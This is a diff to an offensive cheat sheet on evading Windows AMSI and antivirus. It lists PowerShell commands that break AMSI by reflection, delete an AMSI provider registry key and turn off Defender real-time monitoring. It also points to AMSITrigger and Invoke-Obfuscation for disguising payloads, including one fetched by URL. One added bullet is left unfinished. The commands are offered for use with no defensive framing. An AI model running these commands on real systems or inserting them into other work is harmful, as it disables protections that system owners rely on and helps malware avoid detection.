@@ -1,4 +1,5 @@
 #  Bypass Windows AMSI / AV Evasion
+- Using commands in shell:
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
@@ -7,6 +8,19 @@
 Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
 
 Set-MpPreference -DisableRealtimeMonitoring $true
+```
+- Using 
+- Using [AMSITrigger.exe](https://github.com/RythmStick/AMSITrigger). This will show powershell triggers and help to modify the payload manually. 
+```powershell
+AmsiTrigger.exe -i shell.ps1
+```
+- Using [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). As it encodes the payload in numerous ways.
+```powershell
+Import-Module ./Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+SET SCRIPTBLOCK <Payload>
+OR
+SET SCRIPTPATH <URL of payload>
 ```
 
 # Disable real-time protection on Windows.
